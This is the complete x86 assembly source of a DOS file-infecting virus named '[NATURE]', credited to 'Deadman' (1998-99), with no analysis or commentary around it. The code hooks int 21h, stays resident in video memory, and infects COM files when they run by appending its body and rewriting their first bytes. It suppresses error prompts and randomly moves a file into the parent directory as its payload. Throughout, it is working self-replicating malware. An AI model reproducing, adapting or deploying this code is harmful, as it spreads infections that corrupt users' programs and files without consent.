               model   tiny

               codeseg
               locals
               org 100h

    Nature:        db  0e9h,0,0        ; real nop

               neg sp
               not sp
               inc sp

               push    ax bx cx dx si di bp
               push    ss
               pop ss

               call    getlocation     ; get extra offset
    getlocation:       pop bp
               sub bp,offset   getlocation

               call    payload

               mov ax,0ffffh       ; verify if resident
               int 21h
               cmp ax,0faceh
               je  complete

               xor ax,ax           ; get the copy of
               mov ds,ax           ; int 21h vector
               mov si,21h*4
               lea di,old21+bp
               movsw
               movsw
               mov si,21h*4
               lea di,old21c+bp
               movsw
               movsw

               xor ax,ax           ; copy integrity check
               mov es,ax           ; subroutine to vector
               mov ax,cs           ; table (0000:0200)
               mov ds,ax
               mov di,200h
               lea si,tester+bp
               mov cx,endt-tester
               rep movsb

               mov ax,0bb00h       ; load virus to video
               mov es,ax           ; memory
               mov ax,cs
               mov ds,ax
               lea si,Nature+bp
               mov di,100h
               mov cx,endv-Nature
               rep movsb

               xor ax,ax           ; set int 21h vector
               mov es,ax           ; to 0000:0200
               mov di,21h*4
               mov ax,200h
               stosw
               xor ax,ax
               stosw

    complete:      mov ax,cs           ; restore the original
               mov ds,ax           ; begin of infected
               mov es,ax           ; program
               mov di,100h
               lea si,prev+bp
               mov ax,1200h
               int 2fh
               mov ah,al
               xor word ptr [si],ax
               neg byte ptr [si+2]
               movsw
               movsb

               pop bp di si dx cx bx ax    ; restore registers

               mov ds:[0fffch],0100h   ; save 100h on stack
               mov sp,0fffch
               ret             ; virus return

    elsebyte       dw  1234h

    prev           db  not 0c3h,0,0        ; stored begin
    jump           db  0e9h,0,0
    old21          dw  0,0

    tester:        pushf               ; virus integrity check
               push    ds ax
               mov ax,0bb00h
               mov ds,ax
               cmp word ptr sign,'N['  ; number 1
               jne crash
               cmp word ptr sign+2,'TA'    ; number 2
               jne crash
               cmp word ptr elsebyte,1234h ; number 3
               jne crash
               pop ax ds           ; passed
               popf
               db  0eah            ; jump virus
               dw  int21h,0bb00h
    crash:         mov ax,word ptr cs:[old21c-tester+200h]
               mov word ptr cs:[21h*4],ax  ; Crashed, reset int21h
               mov ax,word ptr cs:[old21c+2-tester+200h]
               mov word ptr cs:[21h*4+2],ax
               pop ax ds
               popf
               db  0eah
    old21c         dw  0h,0h
    endt:

    sign           db  '[NATURE]',0
               db  'Copyright (C) 1998-99 Deadman',0

    int21h:        pushf               ; int 21h handler

               cmp ax,0ffffh       ; test if TSR?
               jne nottsr
               mov ax,0faceh
               popf
               iret
    nottsr:        cmp ax,4b00h        ; execute?
               je  INFECT
               popf
               jmp dword ptr cs:old21

    INFECT:        push    ax bx cx dx si di es ds

               xor ax,ax           ; take and set int 24h
               mov es,ax
               push    word ptr es:[24h*4+2]
               push    word ptr es:[24h*4]
               mov word ptr es:[24h*4],offset int24h
               mov word ptr es:[24h*4+2],cs

               pushf               ; interrupt return ;-)
               push    cs
               push    offset contin
    int24h:        mov al,3
               iret

    contin:        mov ax,4300h        ; get and set file
               int 21h         ; attributes
               mov si,cx
               xor cx,cx
               mov ax,4301h
               int 21h
               jnc a0
               jmp noinf
    a0:            push    dx ds si

               mov ax,3d02h        ; open file for r/w
               int 21h
               jnc a1
               jmp fuck
    a1:            mov bx,ax
               mov ax,5700h
               int 21h
               push    cx dx

               mov ax,cs           ; read 3 first bytes
               mov ds,ax
               mov es,ax
               mov ah,3fh
               lea dx,prev
               mov cx,3
               int 21h
               cmp ax,cx
               je  a2
               jmp fuckc

    a2:            mov ax,4202h        ; lseek eof
               xor cx,cx
               xor dx,dx
               int 21h
               or  dx,dx
               jz  a3
               jmp fuckc

    a3:            cmp ax,64000        ; large?
               jbe a4
               jmp fuckc
    a4:            cmp byte ptr prev,0e9h
               jne a5
               push    ax
               sub ax,endv-Nature
               cmp word ptr prev+1,ax
               pop ax
               je  fuckc

    a5:            cmp word ptr prev,'MZ'  ; exe code type?
               je  fuckc
               cmp word ptr prev,'ZM'
               je  fuckc

               mov word ptr jump+1,ax  ; new jump

               mov ax,1200h
               int 2fh
               mov ah,al
               xor word ptr prev,ax
               neg byte ptr prev+2
               mov ah,40h          ; write virus body
               mov cx,endv-Nature      ; to the eof
               lea dx,Nature
               int 21h
               xor cx,ax
               jnz fuckc

               mov ax,4200h        ; lseek bof
               xor cx,cx
               xor dx,dx
               int 21h

               mov ah,40h          ; write new jump
               mov cx,3
               lea dx,jump
               int 21h

    fuckc:         pop dx cx           ; restore file
               mov ax,5701h        ; time/date
               int 21h

               mov ah,3eh          ; close file
               int 21h

    fuck:          pop cx ds dx        ; reset file
               mov ax,4301h        ; attributes
               int 21h

    noinf:         xor ax,ax           ; reset int 24h vector
               mov ds,ax
               pop word ptr ds:[24h*4]
               pop word ptr ds:[24h*4+2]
               pop ds es di si dx cx bx ax
               popf

               jmp dword ptr cs:old21  ; goto old handler

    fmask          db  '*.*',0

   ;           úúú PAYLOAD úúú

    payload:       in  al,40h
               test    al,1111111b
               jz  $+3
               ret

               push    ds es
               mov ah,1ah          ; set new dta
               lea dx,dta+bp
               int 21h

               xor ax,ax           ; take and set int 24h
               mov es,ax
               push    word ptr es:[24h*4+2]
               push    word ptr es:[24h*4]
               mov ah,2ah
               int 21h
               lea ax,int24h+bp
               mov word ptr es:[24h*4],ax
               mov word ptr es:[24h*4+2],cs

               mov ax,cs
               mov es,ax
               xor si,si

               mov ah,4eh          ; find first file
               mov cx,0            ; and get number of
               lea dx,fmask+bp     ; files in this
    findnext:      int 21h         ; directory
               jc  nomore
               inc si
               mov ah,4fh
               jmp findnext
    nomore:        cmp si,1
               jbe nofiles

               in  ax,40h          ; get random file
               xor dx,dx
               div si
               mov si,dx

               mov ah,4eh          ; get one's name
               lea dx,fmask+bp
               mov cx,0
    _findnext:     int 21h
               mov ah,4fh
               dec si
               jnz _findnext

               mov ah,56h          ; move it to the
               lea dx,dta+bp+1eh       ; parent directory
               lea di,dta+bp+1eh-3
               mov [di],'..'
               mov byte ptr [di+2],'\'
               in  al,40h
               test    al,11b
               jnz move
               inc di
               inc di
    move:          int 21h

    nofiles:       xor ax,ax           ; reset int 24h vector
               mov ds,ax
               pop word ptr ds:[24h*4]
               pop word ptr ds:[24h*4+2]

               pop es ds
               mov ah,1ah          ; reset dta address
               mov dx,80h
               int 21h

               ret             ; return

    endv:
    dta            db  43 dup (?)

                           end     Nature
